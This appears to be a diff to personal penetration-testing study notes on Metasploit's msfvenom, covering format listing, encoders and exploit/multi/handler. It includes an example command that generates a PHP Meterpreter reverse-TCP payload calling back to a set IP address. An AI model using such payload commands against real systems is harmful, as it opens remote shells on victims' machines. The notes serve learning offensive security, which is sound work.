@@ -115,5 +115,18 @@
 			- Will list all active sessions
 
 - MSFVENOM
-	- `msfvenom`
-		- 
+- `msfvenom`
+	- `msvenom --list formats`
+		- Will list supported output formats
+			- ie Python
+	- Encoders
+		- Using modern obfuscation techniques or learning methods to inject shellcode is a better solution for a Red Team Operatives problem
+		- But some encoding can help
+		- Example:
+			- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.123.123.123 -f raw -e php/`
+			- `-p` is the parameter for payload
+			- `-f` is for format, the output format, in this case it will be raw
+			- `-e` is the encoder
+	- Using `exploit/multi/handler`
+		- To receive returned (reversed) shells
+	- 
